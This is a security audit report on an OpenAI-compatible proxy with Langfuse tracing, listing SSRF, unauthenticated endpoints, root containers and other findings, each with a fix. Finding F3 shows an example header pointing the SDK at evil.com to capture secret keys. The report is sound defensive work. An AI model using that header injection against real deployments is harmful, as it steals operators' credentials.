# Security Audit Report — Langfuse-Openai-Proxy

**Date**: 2026-05-08 | **Scope**: Full source code | **Findings**: 3 Critical, 5 High, 8 Medium, 6 Low, 3 Info

## Executive Summary

The proxy has three critical vulnerabilities that should be fixed before any public production deployment: an unauthenticated SSRF passthrough endpoint, unauthenticated model endpoints that consume upstream API resources, and a user-controlled `X-Langfuse-Host` header that enables credential exfiltration. The most dangerous is Finding 3 — an attacker can redirect Langfuse SDK traffic to their own server and capture the victim's secret keys.

---

## CRITICAL (fix before any public deployment)

### F1: Unauthenticated SSRF via Passthrough Endpoint
**File**: `langfuse_openai_proxy/api/routes.py:146-170`

The `/v1/{path:path}` endpoint requires **no authentication**. Any caller can proxy arbitrary requests to the upstream backend with the server's `UPSTREAM_API_KEY`. No path validation — traversal sequences like `..` are forwarded.

**Fix**: Add `parse_credentials()` auth check. Validate path against allowed patterns. Reject `..` and encoded traversal.

### F2: Unauthenticated Model Endpoints Expose Upstream API
**File**: `langfuse_openai_proxy/api/routes.py:55-81`

`GET /v1/models` and `GET /v1/models/{model}` require **no auth** but use `settings.upstream_api_key` to query upstream. Anyone can enumerate models and consume upstream resources.

**Fix**: Require authentication on these endpoints.

### F3: SSRF via X-Langfuse-Host Header (Credential Exfiltration)
**File**: `langfuse_openai_proxy/api/routes.py:89,95` / `langfuse_openai_proxy/infrastructure/langfuse_client.py:24`

The `X-Langfuse-Host` header is passed directly as `base_url` to the Langfuse SDK. An attacker sets `X-Langfuse-Host: https://evil.com` — the SDK sends trace data including `secret_key`/`public_key` to the attacker's server.

**Fix**: Validate host against a strict allowlist. Reject non-HTTPS, private IPs, and untrusted domains.

---

## HIGH

### F4: No Rate Limiting
No rate limiting on any endpoint. Expensive endpoints (chat, embeddings) are unprotected against abuse.

### F5: Per-Request Langfuse Client Creation
Every request creates a new `Langfuse` instance (HTTP connections, threads, queues). Under load, this exhausts resources. Use a client pool.

### F6: Unvalidated extra_params Kwargs Explosion
All request body keys (except model/messages/stream) are forwarded as `**kwargs` to the OpenAI SDK with no allowlist. Could inject unexpected SDK parameters.

### F7: Container Runs as Root
`Dockerfile` uses `python:3.12-slim` without creating a non-root user. Add `RUN useradd --create-home app && USER app`.

### F8: No .dockerignore
`COPY . .` copies `.git/`, tests, CI config, and potentially `.env` files into the image.

---

## MEDIUM

| # | Finding | File | Line |
|---|---------|------|------|
| F9 | No CORS policy configured | `api/app.py` | 12-20 |
| F10 | Global httpx client never closed (connection leak) | `openai_client.py` | 11 |
| F11 | No request body size limit (OOM risk) | `api/routes.py` | 84,121,146 |
| F12 | Passthrough forwards all upstream response headers | `api/routes.py` | 170 |
| F13 | Health endpoint enables service discovery | `api/routes.py` | 49-52 |
| F14 | Path traversal risk in passthrough URL | `api/routes.py` | 146-154 |
| F15 | No TLS (credentials in cleartext if exposed directly) | `__main__.py` | 11 |
| F16 | API key fallback `"none"` masks misconfiguration | `openai_client.py` | 25 |

---

## LOW / INFO

| # | Finding |
|---|---------|
| F17 | Version disclosure via `__version__` |
| F18 | `--root-user-action=ignore` hides root pip warning |
| F19 | No security response headers |
| F20 | Broad `except Exception:` swallows errors in get_model |
| F21 | CI has no security scanning (pip-audit, bandit, trufflehog) |
| F22 | Unpinned dependency versions (`>=` only) |
| F23 | Debug mode not explicitly disabled |
| F24 | Binding to 0.0.0.0 in container (standard but document) |
| F25 | No request/audit logging |
